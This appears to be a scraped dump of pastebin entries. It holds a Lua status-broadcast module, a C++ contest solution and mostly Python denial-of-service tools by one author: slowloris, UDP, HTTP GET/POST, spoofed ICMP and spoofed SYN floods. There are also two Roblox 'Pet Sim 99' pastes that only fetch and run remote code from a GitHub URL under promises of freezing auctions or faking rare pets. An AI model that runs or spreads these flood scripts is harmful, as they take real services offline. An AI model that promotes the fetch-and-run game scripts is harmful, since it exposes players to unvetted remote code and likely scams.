local modem = nil
local status = module.IDLE
local config = {
    tags = {},
    modem = ""modem"",
    mode = ""broadcast""
}

local function loadConfigs()
    if not fs.exists(""/config/status.cfg"") then
        return
    end

    local file = fs.open(""/config/status.cfg"", ""r"")
    local configOverride = textutils.unserialize(file.readAll())
    file.close()

    for key, value in pairs(configOverride) do
        config[key] = value
    end
end

function module.setup()
    if isSetup then
        return
    end

    loadConfigs()

    if config.mode == ""broadcast"" then
        rednet.open(config.modem)
    else
        if config.modem == ""modem"" then
            modem = peripheral.find(""modem"")
        else
            modem = peripheral.wrap(config.modem)
        end
    end

    isSetup = true
end

local function broadcast(message)
    rednet.broadcast(message, ""status"")
end

local function sendStatus()
    if config.mode == ""broadcast"" then
        if not rednet.isOpen(config.modem) then
            error(""Rednet not open"")
        end
    else
        if modem == nil then
            error(""Modem not found"")
            return
        end
    end


    local deviceName = os.getComputerLabel() or os.getComputerID()

    local message = {
        status = status,
        deviceName = deviceName,
        tags = config.tags
    }

    if config.mode == ""broadcast"" then
        broadcast(message)
    end

    if hasLogger then
        logger.log(logger.DEBUG, ""Sent status: "" .. status)
    end
end

function module.changeStatus(newStatus)
    if not isSetup then
        error(""Status module not set up"")
        return
    end

    local oldStatus = status
    status = newStatus

    if status ~= oldStatus then
        sendStatus()
    end
end

return module
"
SJRSAqJ4,Untitled,Josif_tepe,C++,Saturday 16th of March 2024 10:13:24 AM CDT,"#include <bits/stdc++.h>
using namespace std;
const int maxn = 1005;
int n, m, k;
int mat[maxn][maxn];
int dp[1 << 5][maxn];
int rec(vector<int> rows, int bitmask, int at) {
    if(dp[bitmask][at] != -1) {
        return dp[bitmask][at];
    }
    int res = 0;
    
    for(int i = at + 1; i < m; i++) {
        bool ok = true;
        int sum = 0;
        for(int j = 0; j < rows.size(); j++) {
            if(mat[rows[j]][at] > mat[rows[j]][i]) {
                ok = false;
                break;
            }
            sum += mat[rows[j]][i];
        }
        if(ok) {
            res = max(res, rec(rows, bitmask,  i) + sum);
        }
    }
    return dp[bitmask][at] = res;
}
int main() {
    ios_base::sync_with_stdio(false);
    cin >> n >> m >> k;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cin >> mat[i][j];
        }
    }
    int res = 0;
    vector<int> v;
    memset(dp, -1, sizeof dp);
    for(int bitmask = 0; bitmask < (1 << n); bitmask++) {
        if(__builtin_popcount(bitmask) == k) {
            vector<int> rows;
            for(int i = 0; i < n; i++) {
                if(bitmask & (1 << i)) {
                    rows.push_back(i);
                }
            }

            for(int i = 0; i < m; i++) {
                int sum = 0;
                for(int j = 0; j < rows.size(); j++) {
                    sum += mat[rows[j]][i];
                }
                int tmp_res = rec(rows, bitmask,  i) + sum;
                if(tmp_res > res) {
                    res = tmp_res;
                    v = rows;
                }
                else if(tmp_res == res) {
                    v = min(v, rows);
                }
            }
        }
    }
    cout << res << endl;
    for(int i = 0; i < v.size(); i++) {
        cout << v[i] + 1 << "" "";
    }
     
    return 0;
}
"
u98m5Dta,exile.py,betrayed,Python,Saturday 16th of March 2024 10:06:18 AM CDT,"import socket, random, time, sys
from urllib.parse import urlparse

# slowloris HTTP-GET DoS script
# modified / improved by betrayed
# Original creator:
#     gist.github.com/abidkhan484


ip = ''
domain = ''

list_of_sockets = []

regular_headers = [
    ""User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"",
    ""Accept-Language: en-US,bn;q=0.7,en;q=0.3""
]

def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((sys.argv[1], int(sys.argv[2])))

    # SEND INITIAL GET HEADER
    s.send((""GET /?{} HTTP/1.1\r\n"").format(random.randint(0, 2000)).encode(""utf-8""))
    for header in regular_headers:
        s.send(""{}\r\n"".format(header).encode(""utf-8""))
    return s

def main():
    if len(sys.argv) != 6:
        sys.exit(""\r\n   SYNTAX: <URL/DOMAIN> <PORT> <TIME> <SOCKET/S> <WAIT(SEC)>"")
    
    print(""""""\r\n\r\n\r\n\r\n\r\n
     ███████╗ ██╗  ██╗  ██╗  ██╗      ███████╗
    ██╔═════╝ ██║██╔═╝ ██╔╝ ██╔╝     ██╔═════╝
   █████╗     ███╔═╝  ██╔╝ ██╔╝     █████╗  
  ██╔═══╝   ██╔██║   ██╔╝ ██╔╝     ██╔═══╝  
 ███████╗ ██╔═╝██║  ██╔╝ ███████╗ ███████╗
 ╚══════╝ ╚═╝  ╚═╝  ╚═╝  ╚══════╝ ╚══════╝
"""""")
    print(""~Low and $low --- Attacking host "" + sys.argv[1] + "" for "" + sys.argv[3] + "" seconds..."")
    print('STRIKE ""CTRL + C"" TO END\r\n')
    
    # DNS RESOLUTION
    try:
        xhost = sys.argv[1]
        if not (xhost.lower().startswith(""http://"") or xhost.lower().startswith(""https://"")):
            xhost = ""http://"" + xhost
    
        domain = urlparse(xhost).netloc
        ip = socket.gethostbyname(domain)
    except:
        sys.exit(""Critical error encountered!"")
    
    domain = urlparse(sys.argv[1]).netloc
    ip = socket.gethostbyname(domain)
    socket_count = ip = int(sys.argv[4])
    
    # LAUNCH ATTACK / BUILD INITIAL SOCKET/S
    for _ in range(socket_count):
        try:
            s = init_socket()
        except socket.error:
            break
        list_of_sockets.append(ip)

    stopAt = time.time() + int(sys.argv[3])
    while time.time() < stopAt:
        # SEND KEEP-ALIVE HEADER
        for s in list(list_of_sockets):
            if time.time() > stopAt:
                sys.exit()
            else:
                try:
                    s.send(""X-a: {}\r\n"".format(random.randint(1, 5000)))
                except:
                    list_of_sockets.remove(s)


        for _ in range(socket_count - len(list_of_sockets)):
            if time.time() > stopAt:
                sys.exit()
            else:
                # REBUILD DEAD SOCKET/S
                try:
                    s = init_socket()
                    if s:
                        list_of_sockets.append(s)
                except socket.error:
                    break
        try:
            # LET SOCKET/S HANG FOR A BIT...
            time.sleep(int(sys.argv[5]))
        except KeyboardInterrupt:
            sys.exit()

    sys.exit()
    
if __name__==""__main__"":
    main()


"
s183Ww5f,go2sleep.py,betrayed,Python,Saturday 16th of March 2024 10:04:02 AM CDT,"# -*- coding: utf-8 -*-

# UDP attack script
# Coded by betrayed
# Tested on : CentOS 3.10.0-1160.e17.x86_64
#             Red Hat 64-bit
#             Windows 11, 23H2 [OS build 22631.3155]
#             Ubuntu Server 23.10 / x64

import time, sys, socket

banner = """"""\r\n\r\n\r\n\r\n
 ██████╗  ██████╗   ██████╗   ███████╗██╗     ███████╗███████╗██████╗
██╔════╝ ██╔═══██╗  ╚════██╗  ██╔════╝██║     ██╔════╝██╔════╝██╔══██╗
██║  ███╗██║   ██║   █████╔╝  ███████╗██║     █████╗  █████╗  ██████╔╝
██║   ██║██║   ██║  ██╔═══╝   ╚════██║██║     ██╔══╝  ██╔══╝  ██╔═══╝
╚██████╔╝╚██████╔╝  ███████╗  ███████║███████╗███████╗███████╗██║
 ╚═════╝  ╚═════╝   ╚══════╝  ╚══════╝╚══════╝╚══════╝╚══════╝╚═╝
""""""

def main():
    if len(sys.argv) < 5:
        sys.exit(""\r\n   SYNTAX: <IP> <PORT> <SIZE> <SECOND/S>"")

    data = """"
    while len(data) < int(sys.argv[3]):
        data = data + ""&""

    print(banner)
    print(""\r\nStrangling "" + sys.argv[1] + "" @ "" + sys.argv[2] + "" for "" + sys.argv[4] + "" seconds..."")

    stopAt = time.time() + int(sys.argv[4])
    while time.time() < stopAt:
        try:
            
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(data.encode(), (sys.argv[1], int(sys.argv[2])))
            
        except KeyboardInterrupt:
            sys.exit(""\r\nJob aborted by user :(\r\n"")
            
    sys.exit(""\r\nJob complete!\r\n"")

if __name__ == ""__main__"":
    main()
"
TEsZh154,beast.py,betrayed,Python,Saturday 16th of March 2024 10:03:11 AM CDT,"# -*- coding: utf-8 -*-

# LAYER-7 HTTP DDOS SCRIPT VIA GET/POST ABUSE
# PROGRAMMED BY BETRAYED - 07.25.2023
import socket, random, string, sys, time

usrAgnt = [""Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.0.1) Gecko/20020920 Netscape/7.0"",
""Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.3) Gecko/20060427 Camino/1.0.1"",
""Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.3) Gecko/20090912 Gentoo Firefox/3.5.3 FirePHP/0.3"",
""Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4) Gecko/2008111318 Ubuntu/8.10 (intrepid) Firefox/3.0.4"",
""Mozilla/5.0 (X11; U; Slackware Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.30 Safari/532.5"",
""Mozilla/5.0 (Linux; Tizen 2.3; SmartHub; SMART-TV; SmartTV; U; Maple2012) AppleWebKit/538.1+ (KHTML, like Gecko) TV Safari/538.1+"",
""Mozilla/5.0 (iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4"",
""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 YaBrowser/19.12.3.320 Yowser/2.5 Safari/537.36"",
""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/58.0.3135.132"",
""Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"",
""Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.31 SmartTV/7.5"",
""Mozilla/5.0 (Linux; Android 9; SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 YaBrowser/19.1.0.2644 Yowser/2.5 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.1026 Yowser/2.5 Safari/537.36"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"",
""Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"",
""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"",
""Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"",
""Mozilla/5.0 (Linux; Holocaust-OS 666.0; DE-1337 Build/1488) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36"",
""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/78.0.3904.70 Safari/537.36"",
""Mozilla/5.0 (Linux; Android 5.1.1; C6903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"",
""Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"",
""Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) snap Chromium/79.0.3945.117 Chrome/79.0.3945.117 Safari/537.36"",
""Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0"",
""Mozilla/5.0 (Linux; Android 8.1.0; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36"",
""Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:75.0) Gecko/20100101 Firefox/75.0"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363"",
""Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"",
""Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1"",
""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"",
""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"",
""Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko"",
""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36"",
""Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"",
""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"",
""Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"",
""Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.0.4) Gecko/2008111710 Firefox/3.0.4"",
""Mozilla/4.8 (X11; U; BeastOS i686; ru-RU; rv:1.3.3.7) Gecko/20020920 Netscape/7.0"",
""AppleCoreMedia/1.0.0.12B466 (Apple TV; U; CPU OS 8_1_3 like Mac OS X; en_us)"",
""Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00"",
""Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)"",
""Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)"",
""Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)"",
""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0;)"",
""Haystack TV/20 (Apple TV; iOS 10.1; Scale/1.00)"",
""Opera/9.51 (Macintosh; Intel Mac OS X; U; en)"",
""Opera/9.52 (X11; Linux x86_64; U; ru)"",
""Mozilla/4.8 [en] (Windows NT 5.0; U)""]

# junk-generation routine
def genJunk(num):
    x = ''.join(random.choices(string.ascii_letters + string.digits, k=num))
    return str(x)

print(""""""\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n
░▒▓███████▓▒░░▒▓████████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░     
░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓████████▓▒░░▒▓██████▓▒░   ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░   ░▒▓█▓▒░     
"""""")

try:
    # format hostname
    target = input(""Target domain/URL: "")
    from urllib.parse import urlparse
    domain = urlparse(target).netloc
    if domain == """":
        domain=str(target)
    
    # resolve hostname to endpoint
    targip = socket.gethostbyname(domain)

    method = input(""Method? GET/POST: "")
    if not (method.upper() == ""GET"") or (method.upper() == ""POST""):
        method = ""GET""

    numprt = int(input(""Port (default 80): ""))
    
    # determine/format http parameter
    param = input('Sub-site (default ""/""): ')
    if not param[0] == ""/"":
        param = ""/"" + param
    
    chs = input(""Append junk to URL? (y/N): "")
    durat = int(input(""Duration - sec (default 300): ""))
    
except KeyboardInterrupt:
    sys.exit(0)
except:
    sys.exit(1)

print('\nReady? Strike ENTER to launch...')
input()

count = 0
endTime = time.time() + durat

while time.time() < endTime:
    try:
        # generate user-agent
        randIndex = random.randint(0, len(usrAgnt) - 1)
        agent = usrAgnt[randIndex]
   
        # configure uri w/ sub-site
        res = """"
        if chs.upper() == ""YES"" or chs.upper() == ""Y"":
            num = random.randint(5, 50)
            res = param + genJunk(num)
        else:
            res = param
    
        # build http header
        header = """"
        if method.upper() == 'POST':
            contLen = random.randint(300, 2500)
            contLen = str(contLen)
            header = ""POST "" + res + "" HTTP/1.1\r\nHost: "" + domain + ""\r\nuser-agent: "" + agent + ""\r\nContent-Length: 3000\r\n\r\n""
        else:
            header = ""GET "" + res + "" HTTP/1.1\r\nHost: "" + domain + ""\r\nuser-agent: "" + agent + ""\r\n\r\n""
        
        # establish socket and connect
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((targip, 80))
        
        # send http header/s
        client.send(b"""" + header.encode())
        
        # close socket
        client.close()
        
        count +=1
        print('SENDING ' + str(count) + ' GIFT BASKETS!')
    except (RuntimeError, Exception):
        count +=1        
        print(""PACKET /""  + str(count) + ""/ DROP! TANGO DOWN?"")
    except KeyboardInterrupt:
        sys.exit()
        
print(""\nDoS complete ;)"")
sys.exit(0)


"
7nLTesek,Pet Sim 99 Auction Freeze Script,quikzyYTbtw,Lua,Saturday 16th of March 2024 10:02:40 AM CDT,"
--JUST COPY THIS SCRIPT INTO UR EXECUTOR AND EXECUTE IT AND LET IT LOAD AND FOLLOW THE INSTRUCTIONS TO FREEZE THE AUCTIONS--
 
--SCRIPT WILL AUTOMATICALLY TELEPORT YOU TO THE TRADING PLAZA AFTER ITS LOADED--

--NEW GUI UPDATE OUT!!-- UPDATED 3/16/2024
 


loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/script-main""))()"
DZTp8wkz,fed-booter.py,betrayed,Python,Saturday 16th of March 2024 09:58:00 AM CDT,"# -*- coding: utf-8 -*-

# Spoofed ICMP DoS by betrayed

from icmplib import ping
import sys, random, string, time

banner = """"""\r\n\r\n\r\n\r
#FedBooter
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNmdhyssoo+++++oosyhdmNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNho:.`                      `-/odMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMm/                                 `+NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd`         DoS coded by betrayed      .NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.                                      /MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMs                              ```       mMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMM-   :sdmNMNmhs/`          .+ymMMMNmho.   oMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMN  -o:` /shmmdNMNy.      :dMMNmmmhs. .++` :MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMh  `       .+mdhmMm     -MMddmh/`       ` .MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMs             :dms.      :yNs.            `MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMo     .:+++/:`  sMh      do`  -/+oo+:`     NMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMM+  `/mMMMMMMMMdo.mMo       :yNMMMMMMMMh-   mMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMM+ .MMMMNNNmmmddy-mMh       +hhhhhhyyyyyoo+:NMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMM+ .:.`           NMd                       mMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMd               .MMh                       NMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMy              oMMh                      -MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMsd-           :NMMy                    `oNMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMo/Mdso++++/::NMmMMo     `+o.  ::-.--:+yhsMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM:+NoMy`    /Ms.MM-       `/   .-:dMhhm.NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-/h+Mm+`   .`.mN              .hMs.m-sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN.-homMMds/-.:hMho/+ymo`   ./hMM//m-/MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN-`hhosmMMMMMMMMy/dMMMMmNMMMNs:hd./MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN: oMh-`:+shhds:::sMNmdhs+- `hy`oMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM+ /MMd/.     ``.`         y/`yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy :NN `-::/o++++-      `s..mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMd.:N      sMMMd.     -o /NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN:::     yMMMs      . sMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy`    :MMmMM`     .dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN:   -MMMMM`    +NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMs`  dMMMs   :dMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNy+yMMM+/smMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
\r\n
""""""

def genJunk(kb_size):
    x = ''.join(random.choices(string.ascii_letters + string.digits, k=int(kb_size)))
    return str(x)
    
def randomIP():
	ip = ""."".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def _doWork():
    if not len(sys.argv) == 4:
        sys.exit(""\r\n    SYNTAX: <IP> <SIZE> <TIME>\r\n"")
        
    if not 'SUDO_UID' in os.environ:
        sys.exit(""\r\n   Script requires root elevation!\r\n"")

    print(banner)
    print(""Engaging tango with "" + sys.argv[2] + "" bytes for "" + sys.argv[3] + "" seconds...\r\n"")
            
    stopAt = time.time() + int(sys.argv[3])

    while time.time() < stopAt:
        try:
            data = genJunk(int(sys.argv[2]))
            fake = randomIP()
            ping(sys.argv[1], count=1, interval=0, timeout=1, id=None, source=fake, family=None, privileged=True, payload=data.encode())
        except KeyboardInterrupt:
            sys.exit(""\r\nJob aborted!\r\n"")
        except:
            pass
        
    sys.exit(""\r\nJob complete!\r\n"")
    
if __name__ == ""__main__"":
    _doWork()

"
Y0AY277S,deadz0ne.py,betrayed,Python,Saturday 16th of March 2024 09:55:23 AM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, time, socket, string, threading, os
from random import *
from scapy.all import *

# multi-threaded SYN denial-of-service script
# coded by betrayed

killSwitch = False

def _ssyn():
    while True:
        try:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)

            IP_Packet = IP ()
            IP_Packet.src = ""."".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = sys.argv[1]

            TCP_Packet = TCP ()	
            TCP_Packet.sport = s_port
            TCP_Packet.dport = int(sys.argv[2])
            TCP_Packet.flags = ""S""
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet/TCP_Packet, verbose=0)
            if killSwitch:
                break
        except:
            pass


def main():
    if len(sys.argv) != 5:
        sys.exit(""\r\n   SYNTAX: <IP> <PORT> <TIME> <THREAD/S>\r\n"")
        
    if not 'SUDO_UID' in os.environ:
        sys.exit(""\r\n   Script requires root elevation!\r\n"")
    
    global killSwitch
        
    print(""""""\r\n\r\n\r\n\r\n\r\n\r\n
   __                      __                                   
  /\ \                    /\ \                                  
  \_\ \     __     __     \_\ \  ____     ___     ___      __   
  /'_` \  /'__`\ /'__`\   /'_` \/\_ ,`\  / __`\ /' _ `\  /'__`\ 
 /\ \L\ \/\  __//\ \L\.\_/\ \L\ \/_/  /_/\ \L\ \/\ \/\ \/\  __/ 
 \ \___,_\ \____\ \__/.\_\ \___,_\/\____\ \____/\ \_\ \_\ \____\
  \/__,_ /\/____/\/__/\/_/\/__,_ /\/____/\/___/  \/_/\/_/\/____/
"""""")
    print("" Sending "" + sys.argv[4] + "" SYN streams to target "" + sys.argv[1] + "":"" + sys.argv[2] + "" for "" + sys.argv[3] + "" seconds...\r\n"")

    tasks = []

    i = 0
    while True:       # while i != int(sys.argv[4])
        i +=1
        x = threading.Thread(target = _ssyn)
        tasks.append(x)
        x.start()
        if i == int(sys.argv[4]):
            break
    
    stopAt = time.time() + int(sys.argv[3])
    try:
        while time.time() < stopAt:
            pass
    except KeyboardInterrupt:
        pass
     
    killSwitch = True
    
    for y in tasks:
        try:
            y.join()
        except:
            pass # mother of God...
    
    sys.exit(""\r\n Job complete!\r\n"")
    
if __name__ == ""__main__"":
    main()
"
ntSG7QVG,Pet Sim 99 Visual Hub [FAKE TITANICS etc.],quikzyYTbtw,Lua,Saturday 16th of March 2024 09:52:20 AM CDT," 
--NEW VISUAL HUB UPDATE FOR PET SIM 99 NEWEST UPDATE THAT CHANGES PETS TO HUGES AND TITANICS, BANANAS ETC-- UPDATED 3/16/2024
 
--EXECUTE THE SCRIPT AND HAVE FUN-- (ALSO VISIBLE IN TRADES,BOOTH etc.)
 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/script-main""))()
 
 "
DKayR8vP,outlaw.py,betrayed,Python,Saturday 16th of March 2024 09:51:04 AM CDT,"# -*- coding: utf-8 -*-
# Spoofed SYN Denial-of-Service script
# Coded by betrayed
# Tested on : Windows 11, 23H2 [OS build 22631.2861]
#             Kali GNU/Linux Rolling 6.6.9-amd64
#
# Traffic confirmed with:
#             Wireshark v4.2.2 (Git v4.2.2 packaged as 4.2.2-1)
